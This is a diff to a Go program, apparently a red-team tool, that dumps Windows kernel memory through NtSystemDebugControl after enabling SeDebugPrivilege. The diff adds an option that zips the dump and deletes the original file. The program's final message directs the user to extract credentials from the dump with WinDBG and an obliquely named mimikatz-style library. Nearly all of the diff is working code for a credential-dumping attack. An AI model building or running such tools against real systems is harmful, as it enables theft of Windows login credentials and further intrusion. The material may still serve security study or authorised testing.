@@ -1,11 +1,14 @@
 package main
 
 import (
+	"archive/zip"
+	"flag"
 	"fmt"
+	"io"
+	"os"
 	"syscall"
 	"unsafe"
 	"golang.org/x/sys/windows"
-	"os"
 )
 
 const SystemDebugControl = 37
@@ -102,9 +105,10 @@ func dumpKernelMemory(outputFile string) error {
 		FileHandle:   fileHandle,
 		BugCheckCode: 0x161,
 		BugCheckParam: [4]uint64{0, 0, 0, 0},
-		Flags:        4, // IncludeUserSpaceMemoryPages flag
+		Flags:        4,
 		Pages:        0,
 	}
+	fmt.Println("[+] Start of kernel memory dump...")
 
 	status, _, _ := ntSystemDebugControl.Call(
 		uintptr(SystemDebugControl),
@@ -132,28 +136,84 @@ func dumpKernelMemory(outputFile string) error {
 	return nil
 }
 
+func compressFile(filePath string) error {
+	fmt.Println("[+] Start compression part...")
+	zipFileName := filePath + ".zip"
+	zipFile, err := os.Create(zipFileName)
+	if err != nil {
+		return err
+	}
+	defer zipFile.Close()
+
+	zipWriter := zip.NewWriter(zipFile)
+	defer zipWriter.Close()
+
+	srcFile, err := os.Open(filePath)
+	if err != nil {
+		return err
+	}
+	defer srcFile.Close()
+
+	writer, err := zipWriter.Create(filePath)
+	if err != nil {
+		return err
+	}
+
+	_, err = io.Copy(writer, srcFile)
+	if err != nil {
+		return err
+	}
+
+	fmt.Println("[+] Compression successful: ", zipFileName)
+	srcFile.Close()
+	
+	// Delete the original file after successful compression
+	if err := os.Remove(filePath); err != nil {
+		fmt.Println("[!] Failed to delete original file:", err)
+	} else {
+		fmt.Println("[+] Original file deleted successfully")
+	}
+
+	return nil
+}
+
 func main() {
 	fmt.Println("[+] Written by @k4nfr3")
-	if !isAdmin() {
-		fmt.Println("Error: This program must be run as Administrator.")
+
+	compressFlag := flag.Bool("compress", false, "Compress the output file into a zip archive")
+	flag.Parse()
+	if flag.NArg() < 1 {
+		fmt.Println("Usage: program <output_file> [--compress]")
 		return
 	}
-	fmt.Println("[+] Running as privileged user")
+	if *compressFlag {
+		fmt.Println("[+] --compress option enabled")
+
+	}
+	if !isAdmin() {
+		fmt.Println("[!] Error: This program must be run as Administrator.")
+		return
+	}
+	fmt.Println("[+] Check passed, you are running as privileged user")
 	if err := enableSeDebugPrivilege(); err != nil {
 		fmt.Println("Warning: Failed to enable SeDebugPrivilege -", err)
 	} else {
 		fmt.Println("[+] SeDebugPrivilege enabled successfully")
 	}
-
-	var outputFile string
-	fmt.Print("Enter the output file path: ")
-	fmt.Scanln(&outputFile)
+	outputFile := flag.Arg(0)
 
 	err := dumpKernelMemory(outputFile)
 	if err != nil {
-		fmt.Println("Error:", err)
+		fmt.Println("[!] Error:", err)
 	} else {
 		fmt.Println("[+] Kernel dump saved to:", outputFile)
-		fmt.Println("[+] Now use WinDBG and m1m1l1b.dll to extract credentials")
 	}
+
+	if *compressFlag {
+		err := compressFile(outputFile)
+		if err != nil {
+			fmt.Println("[!] Compression failed:", err)
+		}
+	}
+	fmt.Println("[+] Now use WinDBG and m1m1l1b.dll to extract credentials")
 }
